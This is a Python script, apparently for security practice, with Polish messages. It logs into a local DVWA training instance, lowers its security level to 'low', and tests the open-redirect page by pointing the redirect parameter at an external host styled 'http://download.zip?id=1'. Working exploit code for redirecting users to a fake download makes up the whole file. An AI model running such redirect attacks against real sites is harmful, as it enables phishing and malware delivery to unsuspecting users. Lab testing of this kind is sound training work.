import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlencode, urlparse, parse_qs

LOGIN_URL = "http://localhost/DVWA/login.php"
SECURITY_URL = "http://localhost/DVWA/security.php"
OPEN_REDIRECT_PAGE = "http://localhost/DVWA/vulnerabilities/open_redirect/"

USERNAME = "gordonb"
PASSWORD = "abc123"

session = requests.Session()

def login():
    print("[*] Logowanie jako gordonb...")
    r = session.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    payload = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token
    }

    session.post(LOGIN_URL, data=payload)
    print(f"[+] Zalogowano jako {USERNAME}")

def set_security_low():
    print("[*] Ustawianie poziomu zabezpieczeń na LOW...")
    r = session.get(SECURITY_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    payload = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": token
    }

    r = session.post(SECURITY_URL, data=payload)
    if "Security level set to low" in r.text:
        print("[+] Poziom zabezpieczeń ustawiony na LOW.")
    else:
        print("[-] Nie udało się ustawić poziomu zabezpieczeń.")

def find_and_modify_redirect():
    print("[*] Odczytywanie formularza lub linku redirecta...")
    r = session.get(OPEN_REDIRECT_PAGE)
    soup = BeautifulSoup(r.text, "html.parser")

    link = soup.find("a", href=lambda href: href and "redirect=" in href)
    if not link:
        print("[-] Nie znaleziono linku z redirectem.")
        return

    href = link['href']
    print(f"[+] Oryginalny link znaleziony: {href}")

    parsed_url = urlparse(href)
    query = parse_qs(parsed_url.query)

    query['redirect'] = ["http://download.zip?id=1"]
    new_query = urlencode(query, doseq=True)

    modified_path = parsed_url.path + "?" + new_query
    full_url = urljoin(OPEN_REDIRECT_PAGE, modified_path)

    print(f"[*] Modyfikujemy redirect i wysyłamy żądanie:\n{full_url}")

    r = session.get(full_url, allow_redirects=False)
    if r.status_code in [301, 302] and 'Location' in r.headers:
        location = r.headers['Location']
        print(f"[!] Odpowiedź z Location: {location}")
        if location.startswith("http://download.zip"):
            print("[!!!] PODATNOŚĆ: Open Redirect potwierdzony.")
        else:
            print("[+] Przekierowanie, ale nie na zewnętrzną domenę.")
    else:
        print("[-] Brak przekierowania lub brak nagłówka Location.")

if __name__ == "__main__":
    login()
    set_security_low()
    find_and_modify_redirect()